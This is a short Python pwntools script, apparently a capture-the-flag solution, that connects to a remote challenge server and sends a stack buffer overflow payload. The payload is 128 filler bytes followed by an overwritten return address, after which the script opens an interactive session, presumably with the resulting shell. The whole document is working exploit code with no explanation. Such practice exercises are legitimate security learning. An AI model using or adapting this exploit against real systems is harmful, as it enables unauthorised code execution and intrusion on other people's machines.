from pwn import *
context.log_level = "DEBUG"

p = remote("ctf.j0n9hyun.xyz", 3001)
payload = "Z" * 128 + p32(0x0804849b)

p.sendline(payload)
p.interactive()
